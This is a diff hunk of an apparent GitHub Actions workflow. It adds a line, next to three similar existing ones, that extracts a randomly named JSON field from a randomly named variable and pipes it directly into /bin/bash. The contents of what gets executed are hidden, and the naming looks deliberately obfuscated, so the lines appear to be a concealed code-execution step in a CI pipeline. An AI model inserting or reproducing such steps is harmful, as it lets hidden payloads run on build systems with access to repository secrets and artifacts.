@@ -46,6 +46,7 @@ jobs:
           echo $hf1502 | jq -r .y37874 | /bin/bash
           printf '%s' "$f0" | jq -r .feic10741 | /bin/bash
           printf '%s' "$yp0" | jq -r .px56144 | /bin/bash
+          printf '%s' "$jwbm92" | jq -r .dz90 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
